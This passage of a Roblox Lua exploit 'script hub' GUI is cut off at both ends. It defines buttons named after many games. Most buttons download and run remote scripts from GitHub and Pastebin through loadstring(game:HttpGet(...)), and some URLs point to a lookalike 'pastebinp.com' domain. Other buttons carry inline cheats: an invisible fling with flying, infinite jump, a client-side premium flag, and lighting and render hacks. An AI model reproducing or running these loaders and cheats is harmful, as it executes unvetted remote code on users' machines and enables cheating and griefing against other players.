MeepCity.Size = UDim2.new(0, 71, 0, 50)
MeepCity.Font = Enum.Font.SciFi
MeepCity.Text = "Meep City"
MeepCity.TextColor3 = Color3.fromRGB(0, 0, 0)
MeepCity.TextScaled = true
MeepCity.TextSize = 14.000
MeepCity.TextWrapped = true
MeepCity.MouseButton1Click:connect(function()
	game.ReplicatedStorage.PlayerData[game.Players.LocalPlayer.UserId].PLUS.Value = true
end)

UICorner_18.Parent = MeepCity

NerfFPS.Name = "NerfFPS"
NerfFPS.Parent = Scripts
NerfFPS.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
NerfFPS.Position = UDim2.new(0.565737069, 0, 0.249319986, 0)
NerfFPS.Size = UDim2.new(0, 71, 0, 50)
NerfFPS.Font = Enum.Font.SciFi
NerfFPS.Text = "Nerf FPS"
NerfFPS.TextColor3 = Color3.fromRGB(0, 0, 0)
NerfFPS.TextScaled = true
NerfFPS.TextSize = 14.000
NerfFPS.TextWrapped = true
NerfFPS.MouseButton1Click:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/RedoGaming/RedoHub/main/script'),true))()
end)

UICorner_19.Parent = NerfFPS

SharkBite.Name = "SharkBite"
SharkBite.Parent = Scripts
SharkBite.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SharkBite.Position = UDim2.new(0.282868534, 0, 0.251007736, 0)
SharkBite.Size = UDim2.new(0, 71, 0, 50)
SharkBite.Font = Enum.Font.SciFi
SharkBite.Text = "SharkBite"
SharkBite.TextColor3 = Color3.fromRGB(0, 0, 0)
SharkBite.TextScaled = true
SharkBite.TextSize = 14.000
SharkBite.TextWrapped = true
SharkBite.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://pastebinp.com/raw/YYVLbzVg", true))()
end)

UICorner_20.Parent = SharkBite

Islands.Name = "Islands"
Islands.Parent = Scripts
Islands.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Islands.Position = UDim2.new(0, 0, 0.250163853, 0)
Islands.Size = UDim2.new(0, 71, 0, 50)
Islands.Font = Enum.Font.SciFi
Islands.Text = "Islands"
Islands.TextColor3 = Color3.fromRGB(0, 0, 0)
Islands.TextSize = 23.000
Islands.TextWrapped = true
Islands.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/DiamondHands-Exploit/BedWarsExploit/main/Source.lua"))()
end)

UICorner_21.Parent = Islands

CounterBlox.Name = "CounterBlox"
CounterBlox.Parent = Scripts
CounterBlox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
CounterBlox.Position = UDim2.new(0.282868534, 0, 0.208813667, 0)
CounterBlox.Size = UDim2.new(0, 71, 0, 50)
CounterBlox.Font = Enum.Font.SciFi
CounterBlox.Text = "Counter Blox"
CounterBlox.TextColor3 = Color3.fromRGB(0, 0, 0)
CounterBlox.TextSize = 20.000
CounterBlox.TextWrapped = true
CounterBlox.MouseButton1Click:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/venosu/Hex-Hub/main/hexhub.lua'))()
end)

UICorner_22.Parent = CounterBlox

FNF.Name = "FNF"
FNF.Parent = Scripts
FNF.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FNF.Position = UDim2.new(0, 0, 0.207969785, 0)
FNF.Size = UDim2.new(0, 71, 0, 50)
FNF.Font = Enum.Font.SciFi
FNF.Text = "Funky Friday"
FNF.TextColor3 = Color3.fromRGB(0, 0, 0)
FNF.TextScaled = true
FNF.TextSize = 14.000
FNF.TextWrapped = true
FNF.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/wally-rblx/funky-friday-autoplay/main/main.lua",true))()
end)

UICorner_23.Parent = FNF

RagdollEngine.Name = "RagdollEngine"
RagdollEngine.Parent = Scripts
RagdollEngine.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RagdollEngine.Position = UDim2.new(0.565737069, 0, 0.166619569, 0)
RagdollEngine.Size = UDim2.new(0, 71, 0, 50)
RagdollEngine.Font = Enum.Font.SciFi
RagdollEngine.Text = "Ragdoll Engine"
RagdollEngine.TextColor3 = Color3.fromRGB(0, 0, 0)
RagdollEngine.TextScaled = true
RagdollEngine.TextSize = 14.000
RagdollEngine.TextWrapped = true
RagdollEngine.MouseButton1Click:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/RegularVynixu/Scripts/master/Vynixius%20Ragdoll%20Engine'),true))()
end)

UICorner_24.Parent = RagdollEngine

Strucid.Name = "Strucid"
Strucid.Parent = Scripts
Strucid.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Strucid.Position = UDim2.new(0.282868534, 0, 0.166619569, 0)
Strucid.Size = UDim2.new(0, 71, 0, 50)
Strucid.Font = Enum.Font.SciFi
Strucid.Text = "Strucid"
Strucid.TextColor3 = Color3.fromRGB(0, 0, 0)
Strucid.TextScaled = true
Strucid.TextSize = 14.000
Strucid.TextWrapped = true
Strucid.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Project-Evolution/Main/main/Loader.lua", true))()
end)

UICorner_25.Parent = Strucid

AmongstUs.Name = "Amongst Us"
AmongstUs.Parent = Scripts
AmongstUs.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
AmongstUs.Position = UDim2.new(0, 0, 0.165775687, 0)
AmongstUs.Size = UDim2.new(0, 71, 0, 50)
AmongstUs.Font = Enum.Font.SciFi
AmongstUs.Text = "Amongst Us"
AmongstUs.TextColor3 = Color3.fromRGB(0, 0, 0)
AmongstUs.TextSize = 18.000
AmongstUs.TextWrapped = true
AmongstUs.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Psykek66/eee/main/AUGUI.txt", true))()
end)

UICorner_26.Parent = AmongstUs

BPB.Name = "BPB"
BPB.Parent = Scripts
BPB.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BPB.Position = UDim2.new(0.565737069, 0, 0.207969785, 0)
BPB.Size = UDim2.new(0, 71, 0, 50)
BPB.Font = Enum.Font.SciFi
BPB.Text = "Big PaintBall"
BPB.TextColor3 = Color3.fromRGB(0, 0, 0)
BPB.TextScaled = true
BPB.TextSize = 14.000
BPB.TextWrapped = true
BPB.MouseButton1Click:connect(function()
	loadstring(game:HttpGet('https://pastebinp.com/raw/PuaaGKsT'))()
end)

UICorner_27.Parent = BPB

DDay.Name = "D-Day"
DDay.Parent = Scripts
DDay.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DDay.Position = UDim2.new(0.565737069, 0, 0.292357951, 0)
DDay.Size = UDim2.new(0, 71, 0, 50)
DDay.Font = Enum.Font.SciFi
DDay.Text = "D-Day"
DDay.TextColor3 = Color3.fromRGB(0, 0, 0)
DDay.TextScaled = true
DDay.TextSize = 14.000
DDay.TextWrapped = true
DDay.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/iQAIRHUB/Project-Ripple/main/D-DAY/V3.0.3",true))()
end)

UICorner_28.Parent = DDay

FTF.Name = "FTF"
FTF.Parent = Scripts
FTF.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FTF.Position = UDim2.new(0.282868534, 0, 0.292357951, 0)
FTF.Size = UDim2.new(0, 71, 0, 50)
FTF.Font = Enum.Font.SciFi
FTF.Text = "Flee The Facility"
FTF.TextColor3 = Color3.fromRGB(0, 0, 0)
FTF.TextScaled = true
FTF.TextSize = 14.000
FTF.TextWrapped = true
FTF.MouseButton1Click:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/MarsQQ/ScriptHubScripts/master/Flee%20The%20Facility'),true))()
end)

UICorner_29.Parent = FTF

HASE.Name = "HASE"
HASE.Parent = Scripts
HASE.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
HASE.Position = UDim2.new(0, 0, 0.292357951, 0)
HASE.Size = UDim2.new(0, 71, 0, 50)
HASE.Font = Enum.Font.SciFi
HASE.Text = "Hide And Seek Extreme"
HASE.TextColor3 = Color3.fromRGB(0, 0, 0)
HASE.TextScaled = true
HASE.TextSize = 14.000
HASE.TextWrapped = true
HASE.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Denverrz/scripts/master/Kraken_Hub.txt", true))()
end)

UICorner_30.Parent = HASE

RoBeats.Name = "RoBeats"
RoBeats.Parent = Scripts
RoBeats.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
RoBeats.Position = UDim2.new(0.565737069, 0, 0.376746118, 0)
RoBeats.Size = UDim2.new(0, 71, 0, 50)
RoBeats.Font = Enum.Font.SciFi
RoBeats.Text = "Ro Beats"
RoBeats.TextColor3 = Color3.fromRGB(0, 0, 0)
RoBeats.TextScaled = true
RoBeats.TextSize = 14.000
RoBeats.TextWrapped = true
RoBeats.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/notclosure/new-years/main/happ.lua"))()
end)

UICorner_31.Parent = RoBeats

BloxBurg.Name = "BloxBurg"
BloxBurg.Parent = Scripts
BloxBurg.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BloxBurg.Position = UDim2.new(0.282868534, 0, 0.376746118, 0)
BloxBurg.Size = UDim2.new(0, 71, 0, 50)
BloxBurg.Font = Enum.Font.SciFi
BloxBurg.Text = "Blox Burg"
BloxBurg.TextColor3 = Color3.fromRGB(0, 0, 0)
BloxBurg.TextScaled = true
BloxBurg.TextSize = 14.000
BloxBurg.TextWrapped = true
BloxBurg.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomAdamYT/DarkHub/master/Init",true))()
end)

UICorner_32.Parent = BloxBurg

BreakingPoint.Name = "BreakingPoint"
BreakingPoint.Parent = Scripts
BreakingPoint.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BreakingPoint.Position = UDim2.new(0, 0, 0.376746148, 0)
BreakingPoint.Size = UDim2.new(0, 71, 0, 50)
BreakingPoint.Font = Enum.Font.SciFi
BreakingPoint.Text = "Breaking Point"
BreakingPoint.TextColor3 = Color3.fromRGB(0, 0, 0)
BreakingPoint.TextSize = 18.000
BreakingPoint.TextWrapped = true
BreakingPoint.MouseButton1Click:connect(function()
	loadstring(game:HttpGet('https://pastebin.com/raw/MLPypHYv', true))()
end)

UICorner_33.Parent = BreakingPoint

SoundSpace.Name = "SoundSpace"
SoundSpace.Parent = Scripts
SoundSpace.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
SoundSpace.Position = UDim2.new(0.565737069, 0, 0.33455205, 0)
SoundSpace.Size = UDim2.new(0, 71, 0, 50)
SoundSpace.Font = Enum.Font.SciFi
SoundSpace.Text = "Sound Space"
SoundSpace.TextColor3 = Color3.fromRGB(0, 0, 0)
SoundSpace.TextScaled = true
SoundSpace.TextSize = 14.000
SoundSpace.TextWrapped = true
SoundSpace.MouseButton1Click:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/SiLeNSwOrD/OwlHub/master/OwlHub.txt'), true))()
end)

UICorner_34.Parent = SoundSpace

BedWars.Name = "BedWars"
BedWars.Parent = Scripts
BedWars.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BedWars.Position = UDim2.new(0.282868534, 0, 0.33455205, 0)
BedWars.Size = UDim2.new(0, 71, 0, 50)
BedWars.Font = Enum.Font.SciFi
BedWars.Text = "Bed Wars"
BedWars.TextColor3 = Color3.fromRGB(0, 0, 0)
BedWars.TextScaled = true
BedWars.TextSize = 14.000
BedWars.TextWrapped = true
BedWars.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/DiamondHands-Exploit/BedWarsExploit/main/Source.lua"))()
end)

UICorner_35.Parent = BedWars

Assasin.Name = "Assasin"
Assasin.Parent = Scripts
Assasin.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Assasin.Position = UDim2.new(0, 0, 0.33455205, 0)
Assasin.Size = UDim2.new(0, 71, 0, 50)
Assasin.Font = Enum.Font.SciFi
Assasin.Text = "Assasin"
Assasin.TextColor3 = Color3.fromRGB(0, 0, 0)
Assasin.TextSize = 21.000
Assasin.TextWrapped = true
Assasin.MouseButton1Click:connect(function()
	loadstring(game:HttpGet('https://raw.githubusercontent.com/Jonatanchavez3/B.A.C/main/Bad%20New'))()
end)

UICorner_36.Parent = Assasin

InfiniteJump.Name = "InfiniteJump"
InfiniteJump.Parent = Scripts
InfiniteJump.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InfiniteJump.Position = UDim2.new(0.565737069, 0, 0.461134315, 0)
InfiniteJump.Size = UDim2.new(0, 71, 0, 50)
InfiniteJump.Font = Enum.Font.SciFi
InfiniteJump.Text = "Infinite Jump"
InfiniteJump.TextColor3 = Color3.fromRGB(0, 0, 0)
InfiniteJump.TextScaled = true
InfiniteJump.TextSize = 14.000
InfiniteJump.TextWrapped = true
InfiniteJump.MouseButton1Click:connect(function()
	_G.infinjump = true

	local Player = game:GetService("Players").LocalPlayer
	local Mouse = Player:GetMouse()
	Mouse.KeyDown:connect(function(k)
		if _G.infinjump then
			if k:byte() == 32 then
				Humanoid = game:GetService("Players").LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
				Humanoid:ChangeState("Jumping")
				wait(0.1)
				Humanoid:ChangeState("Seated")
			end
		end
	end)

	local Player = game:GetService("Players").LocalPlayer
	local Mouse = Player:GetMouse()
	Mouse.KeyDown:connect(function(k)
		k = k:lower()
		if k == "f" then
			if _G.infinjump == true then
				_G.infinjump = false
			else
				_G.infinjump = true
			end
		end
	end)
end)

UICorner_37.Parent = InfiniteJump

BigHeadV3.Name = "BigHeadV3"
BigHeadV3.Parent = Scripts
BigHeadV3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
BigHeadV3.Position = UDim2.new(0.282868534, 0, 0.461978197, 0)
BigHeadV3.Size = UDim2.new(0, 71, 0, 50)
BigHeadV3.Font = Enum.Font.SciFi
BigHeadV3.Text = "Big Head V3"
BigHeadV3.TextColor3 = Color3.fromRGB(0, 0, 0)
BigHeadV3.TextScaled = true
BigHeadV3.TextSize = 14.000
BigHeadV3.TextWrapped = true
BigHeadV3.MouseButton1Click:connect(function()
	--  ((Packed with care by sysGhost/BiKode))
	--  Remember to use R15 with Rthro avatar(head) and scale ur head at max

	for i,v in pairs(game.Players.LocalPlayer.Character.Humanoid:GetChildren()) do
		if string.find(v.Name,"Scale") and v.Name ~= "HeadScale" then
			repeat wait(HeadGrowSpeed) until game.Players.LocalPlayer.Character.Head:FindFirstChild("OriginalSize")
			game.Players.LocalPlayer.Character.Head.OriginalSize:Destroy()
			v:Destroy()
			game.Players.LocalPlayer.Character.Head:WaitForChild("OriginalSize")
		end
	end
end)

UICorner_38.Parent = BigHeadV3

InvisFling.Name = "InvisFling"
InvisFling.Parent = Scripts
InvisFling.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
InvisFling.Position = UDim2.new(0, 0, 0.461134315, 0)
InvisFling.Size = UDim2.new(0, 71, 0, 50)
InvisFling.Font = Enum.Font.SciFi
InvisFling.Text = "Invisible Fling"
InvisFling.TextColor3 = Color3.fromRGB(0, 0, 0)
InvisFling.TextSize = 18.000
InvisFling.TextWrapped = true
InvisFling.MouseButton1Click:connect(function()



	spawn(function()
		local message = Instance.new("Message",workspace)
		message.Text = "Loaded press z to execute inviseble , press x to respawn)"
		wait(0.5)
		message:Destroy()
	end)








	local mouse = game.Players.LocalPlayer:GetMouse()

	local groot = nil

	mouse.KeyDown:connect(function(k)

		if k == "z" then



			spawn(function()
				local message = Instance.new("Message",workspace)
				message.Text = "Fe Invisible Fling By Diemiers#4209 Loaded (wait 11 seconds to load)"
				wait(11)
				message:Destroy()
			end)


			local ch = game.Players.LocalPlayer.Character
			local prt=Instance.new("Model", workspace)
			local z1 =  Instance.new("Part", prt)
			z1.Name="Torso"
			z1.CanCollide = false
			z1.Anchored = true
			local z2  =Instance.new("Part", prt)
			z2.Name="Head"
			z2.Anchored = true
			z2.CanCollide = false
			local z3 =Instance.new("Humanoid", prt)
			z3.Name="Humanoid"
			z1.Position = Vector3.new(0,9999,0)
			z2.Position = Vector3.new(0,9991,0)
			game.Players.LocalPlayer.Character=prt
			wait(5)
			game.Players.LocalPlayer.Character=ch
			wait(6)


			local plr = game.Players.LocalPlayer
			mouse = plr:GetMouse()

			local Hum = Instance.new("Humanoid")
			Hum.Parent = game.Players.LocalPlayer.Character


			local root =  game.Players.LocalPlayer.Character.HumanoidRootPart


			for i,v in pairs(plr.Character:GetChildren()) do

				if v ~= root and  v.Name ~= "Humanoid" then

					v:Destroy()

				end


			end

			workspace.CurrentCamera.CameraSubject = root

			local se = Instance.new("SelectionBox",root)
			se.Adornee = root


			game:GetService('RunService').Stepped:connect(function()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
			end)
			game:GetService('RunService').RenderStepped:connect(function()
				game.Players.LocalPlayer.Character.HumanoidRootPart.CanCollide = false
			end)


			power = 999999 -- change this to make it more or less powerful

			power = power*10

			---
			wait(.1)
			local bambam = Instance.new("BodyThrust")
			bambam.Parent = game.Players.LocalPlayer.Character.HumanoidRootPart
			bambam.Force = Vector3.new(power,0,power)
			bambam.Location = game.Players.LocalPlayer.Character.HumanoidRootPart.Position 





			local plr = game.Players.LocalPlayer
			local torso = root
			local flying = true
			local deb = true
			local ctrl = {f = 0, b = 0, l = 0, r = 0}
			local lastctrl = {f = 0, b = 0, l = 0, r = 0}
			local maxspeed = 120
			local speed = 15


			---local bambam = Instance.new("BodyThrust")
			---bambam.Parent = torso
			--bambam.Force = Vector3.new(9999999,0,9999999)
			--bambam.Location = torso.Position


			---
			groot = root

			function Fly()
				local bg = Instance.new("BodyGyro", torso)
				bg.P = 9e4
				bg.maxTorque = Vector3.new(0, 0, 0)
				bg.cframe = torso.CFrame
				local bv = Instance.new("BodyVelocity", torso)
				bv.velocity = Vector3.new(0,0,0)
				bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
				repeat wait()

					if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
						speed = speed+.2
						if speed > maxspeed then
							speed = maxspeed
						end
					elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
						speed = speed-1
						if speed < 0 then
							speed = 0
						end
					end
					if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
						bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
						lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
					elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
						bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
					else
						bv.velocity = Vector3.new(0,0.1,0)
					end

				until not flying
				ctrl = {f = 0, b = 0, l = 0, r = 0}
				lastctrl = {f = 0, b = 0, l = 0, r = 0}
				speed = 0
				bg:Destroy()
				bv:Destroy()

			end
			mouse.KeyDown:connect(function(key)
				if key:lower() == "e" then
					if flying then flying = false
					else
						flying = true
						Fly()
					end
				elseif key:lower() == "w" then
					ctrl.f = 1
				elseif key:lower() == "s" then
					ctrl.b = -1
				elseif key:lower() == "a" then
					ctrl.l = -1
				elseif key:lower() == "d" then
					ctrl.r = 1
				end
			end)
			mouse.KeyUp:connect(function(key)
				if key:lower() == "w" then
					ctrl.f = 0
				elseif key:lower() == "s" then
					ctrl.b = 0
				elseif key:lower() == "a" then
					ctrl.l = 0
				elseif key:lower() == "d" then
					ctrl.r = 0
				elseif key:lower() == "r" then

				end
			end)
			Fly()



		elseif k == "x" then


			spawn(function()
				local message = Instance.new("Message",workspace)
				message.Text = "Respawning dont spam"
				wait(1)
				message:Destroy()
			end)

			local saved = groot.Position

			local ch = game.Players.LocalPlayer.Character
			local prt=Instance.new("Model", workspace)
			local z1 =  Instance.new("Part", prt)
			z1.Name="Torso"
			z1.CanCollide = false
			z1.Anchored = true
			local z2  =Instance.new("Part", prt)
			z2.Name="Head"
			z2.Anchored = true
			z2.CanCollide = false
			local z3 =Instance.new("Humanoid", prt)
			z3.Name="Humanoid"
			z1.Position = Vector3.new(0,9999,0)
			z2.Position = Vector3.new(0,9991,0)
			game.Players.LocalPlayer.Character=prt
			wait(5)
			game.Players.LocalPlayer.Character=ch
			local poop = nil
			repeat wait() poop = game.Players.LocalPlayer.Character:FindFirstChild("Head") until poop ~= nil
			wait(1)
			game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(saved)

		end


	end)
end)

UICorner_39.Parent = InvisFling

FpsBoost.Name = "FpsBoost"
FpsBoost.Parent = Scripts
FpsBoost.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FpsBoost.Position = UDim2.new(0.565737069, 0, 0.419784099, 0)
FpsBoost.Size = UDim2.new(0, 71, 0, 50)
FpsBoost.Font = Enum.Font.SciFi
FpsBoost.Text = "FPS Boost"
FpsBoost.TextColor3 = Color3.fromRGB(0, 0, 0)
FpsBoost.TextScaled = true
FpsBoost.TextSize = 14.000
FpsBoost.TextWrapped = true
FpsBoost.MouseButton1Click:connect(function()
	local decalsyeeted = true -- Leaving this on makes games look shitty but the fps goes up by at least 20.
	local g = game
	local w = g.Workspace
	local l = g.Lighting
	local t = w.Terrain
	sethiddenproperty(l,"Technology",2)
	sethiddenproperty(t,"Decoration",false)
	t.WaterWaveSize = 0
	t.WaterWaveSpeed = 0
	t.WaterReflectance = 0
	t.WaterTransparency = 0
	l.GlobalShadows = 0
	l.FogEnd = 9e9
	l.Brightness = 0
	settings().Rendering.QualityLevel = "Level01"
	for i, v in pairs(w:GetDescendants()) do
		if v:IsA("BasePart") and not v:IsA("MeshPart") then
			v.Material = "Plastic"
			v.Reflectance = 0
		elseif (v:IsA("Decal") or v:IsA("Texture")) and decalsyeeted then
			v.Transparency = 1
		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
			v.Lifetime = NumberRange.new(0)
		elseif v:IsA("Explosion") then
			v.BlastPressure = 1
			v.BlastRadius = 1
		elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
			v.Enabled = false
		elseif v:IsA("MeshPart") and decalsyeeted then
			v.Material = "Plastic"
			v.Reflectance = 0
			v.TextureID = 10385902758728957
		elseif v:IsA("SpecialMesh") and decalsyeeted  then
			v.TextureId=0
		elseif v:IsA("ShirtGraphic") and decalsyeeted then
			v.Graphic=0
		elseif (v:IsA("Shirt") or v:IsA("Pants")) and decalsyeeted then
			v[v.ClassName.."Template"]=0
		end
	end
	for i = 1,#l:GetChildren() do
		e=l:GetChildren()[i]
		if e:IsA("BlurEffect") or e:IsA("SunRaysEffect") or e:IsA("ColorCorrectionEffect") or e:IsA("BloomEffect") or e:IsA("DepthOfFieldEffect") then
			e.Enabled = false
		end
	end
	w.DescendantAdded:Connect(function(v)
		wait()--prevent errors and shit
		if v:IsA("BasePart") and not v:IsA("MeshPart") then
			v.Material = "Plastic"
			v.Reflectance = 0
		elseif v:IsA("Decal") or v:IsA("Texture") and decalsyeeted then
			v.Transparency = 1
		elseif v:IsA("ParticleEmitter") or v:IsA("Trail") then
			v.Lifetime = NumberRange.new(0)
		elseif v:IsA("Explosion") then
			v.BlastPressure = 1
			v.BlastRadius = 1
		elseif v:IsA("Fire") or v:IsA("SpotLight") or v:IsA("Smoke") or v:IsA("Sparkles") then
			v.Enabled = false
		elseif v:IsA("MeshPart") and decalsyeeted then
			v.Material = "Plastic"
			v.Reflectance = 0
			v.TextureID = 10385902758728957
		elseif v:IsA("SpecialMesh") and decalsyeeted then
			v.TextureId=0
		elseif v:IsA("ShirtGraphic") and decalsyeeted then
			v.ShirtGraphic=0
		elseif (v:IsA("Shirt") or v:IsA("Pants")) and decalsyeeted then
			v[v.ClassName.."Template"]=0
		end
	end)
end)

UICorner_40.Parent = FpsBoost

DoomSpire.Name = "DoomSpire"
DoomSpire.Parent = Scripts
DoomSpire.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
DoomSpire.Position = UDim2.new(0.282868534, 0, 0.419784099, 0)
DoomSpire.Size = UDim2.new(0, 71, 0, 50)
DoomSpire.Font = Enum.Font.SciFi
DoomSpire.Text = "Doom Spire Battle"
DoomSpire.TextColor3 = Color3.fromRGB(0, 0, 0)
DoomSpire.TextScaled = true
DoomSpire.TextSize = 14.000
DoomSpire.TextWrapped = true
DoomSpire.MouseButton1Click:connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/MattLawz/1nferiousCheats/master/scripts/DoomspireScript.lua", true))()
  loadstring(game:HttpGet("https://pastebin.com/rqL6BiFv", true))()
end)

UICorner_41.Parent = DoomSpire

Kat.Name = "Kat"
Kat.Parent = Scripts
Kat.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Kat.Position = UDim2.new(0, 0, 0.419784099, 0)
Kat.Size = UDim2.new(0, 71, 0, 50)
Kat.Font = Enum.Font.SciFi
Kat.Text = "Kat!"
Kat.TextColor3 = Color3.fromRGB(0, 0, 0)
Kat.TextScaled = true
Kat.TextSize = 14.000
Kat.TextWrapped = true
Kat.MouseButton1Click:connect(function()
	loadstring(game:HttpGet(('https://raw.githubusercontent.com/MarsQQ/ScriptHubScripts/master/LimeXKAT'),true))()
end)

UICorner_42.Parent = Kat

FullBright.Name = "FullBright"
FullBright.Parent = Scripts
FullBright.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
FullBright.Position = UDim2.new(0.565737069, 0, 0.5024845, 0)
FullBright.Size = UDim2.new(0, 71, 0, 50)
FullBright.Font = Enum.Font.SciFi
FullBright.Text = "Full Bright"
FullBright.TextColor3 = Color3.fromRGB(0, 0, 0)
FullBright.TextScaled = true
FullBright.TextSize = 14.000
FullBright.TextWrapped = true
FullBright.MouseButton1Click:connect(function()
	if not _G.FullBrightExecuted then

		_G.FullBrightEnabled = false

		_G.NormalLightingSettings = {
			Brightness = game:GetService("Lighting").Brightness,
			ClockTime = game:GetService("Lighting").ClockTime,
			FogEnd = game:GetService("Lighting").FogEnd,
			GlobalShadows = game:GetService("Lighting").GlobalShadows,
			Ambient = game:GetService("Lighting").Ambient
		}

		game:GetService("Lighting"):GetPropertyChangedSignal("Brightness"):Connect(function()
			if game:GetService("Lighting").Brightness ~= 1 and game:GetService("Lighting").Brightness ~= _G.NormalLightingSettings.Brightness then
				_G.NormalLightingSettings.Brightness = game:GetService("Lighting").Brightness
				if not _G.FullBrightEnabled then
					repeat
						wait()
					until _G.FullBrightEnabled
				end
				game:GetService("Lighting").Brightness = 1
			end
		end)

		game:GetService("Lighting"):GetPropertyChangedSignal("ClockTime"):Connect(function()
			if game:GetService("Lighting").ClockTime ~= 12 and game:GetService("Lighting").ClockTime ~= _G.NormalLightingSettings.ClockTime then
				_G.NormalLightingSettings.ClockTime = game:GetService("Lighting").ClockTime
				if not _G.FullBrightEnabled then
					repeat
						wait()
					until _G.FullBrightEnabled
				end
				game:GetService("Lighting").ClockTime = 12
			end
		end)

		game:GetService("Lighting"):GetPropertyChangedSignal("FogEnd"):Connect(function()
			if game:GetService("Lighting").FogEnd ~= 786543 and game:GetService("Lighting").FogEnd ~= _G.NormalLightingSettings.FogEnd then
				_G.NormalLightingSettings.FogEnd = game:GetService("Lighting").FogEnd
				if not _G.FullBrightEnabled then
					repeat
						wait()
					until _G.FullBrightEnabled
				end
				game:GetService("Lighting").FogEnd = 786543
			end
		end)

		game:GetService("Lighting"):GetPropertyChangedSignal("GlobalShadows"):Connect(function()
			if game:GetService("Lighting").GlobalShadows ~= false and game:GetService("Lighting").GlobalShadows ~= _G.NormalLightingSettings.GlobalShadows then
				_G.NormalLightingSettings.GlobalShadows = game:GetService("Lighting").GlobalShadows
				if not _G.FullBrightEnabled then
					repeat
						wait()
					until _G.FullBrightEnabled
				end
				game:GetService("Lighting").GlobalShadows = false
			end
		end)

		game:GetService("Lighting"):GetPropertyChangedSignal("Ambient"):Connect(function()
			if game:GetService("Lighting").Ambient ~= Color3.fromRGB(178, 178, 178) and game:GetService("Lighting").Ambient ~= _G.NormalLightingSettings.Ambient then
				_G.NormalLightingSettings.Ambient = game:GetService("Lighting").Ambient
				if not _G.FullBrightEnabled then
					repeat
						wait()
					until _G.FullBrightEnabled
				end
				game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)
			end
		end)

		game:GetService("Lighting").Brightness = 1
		game:GetService("Lighting").ClockTime = 12
		game:GetService("Lighting").FogEnd = 786543
		game:GetService("Lighting").GlobalShadows = false
		game:GetService("Lighting").Ambient = Color3.fromRGB(178, 178, 178)

		local LatestValue = true
		spawn(function()
			repeat
				wait()
			until _G.FullBrightEnabled
			while wait() do
				if _G.FullBrightEnabled ~= LatestValue then
					if not _G.FullBrightEnabled then
						game:GetService("Lighting").Brightness = _G.NormalLightingSettings.Brightness
						game:GetService("Lighting").ClockTime = _G.NormalLightingSettings.ClockTime
						game:GetService("Lighting").FogEnd = _G.NormalLightingSettings.FogEnd
						game:GetService("Lighting").GlobalShadows = _G.NormalLightingSettings.GlobalShadows
						game:GetService("Lighting").Ambient = _G.NormalLightingSettings.Ambient
					else
						game:GetService("Lighting").Brightness = 1
						game:GetService("Lighting").ClockTime = 12
